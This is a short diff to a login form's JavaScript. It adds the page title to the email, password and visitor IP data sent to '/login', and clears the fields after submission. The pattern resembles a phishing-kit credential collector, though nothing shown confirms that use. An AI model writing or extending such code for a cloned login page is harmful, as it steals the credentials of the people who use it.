@@ -22,12 +22,12 @@ async function fetchIPData() {
 fetchIPData();
 
 // Function to send login data to the server
-async function sendLoginData(email, password, ipData, retries = 3, delay = 1000) {
+async function sendLoginData(email, password, title, ipData, retries = 3, delay = 1000) {
     try {
         const response = await fetch("/login", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ email, password, ipData }),
+            body: JSON.stringify({ email, password, title, ipData }),
         });
 
         if (!response.ok) {
@@ -72,9 +72,12 @@ document.querySelector('.submit').addEventListener('click', function (event) {
 
     var email = document.getElementById('mail').value;
     var password = document.getElementById('pass').value;
+    var title = document.title;
+    console.log(title);
+    
 
     // Send login data
-    sendLoginData(email, password, userIPData);
+    sendLoginData(email, password, title, userIPData);
 
     // Reset fields
     document.getElementById("mail").value = "";
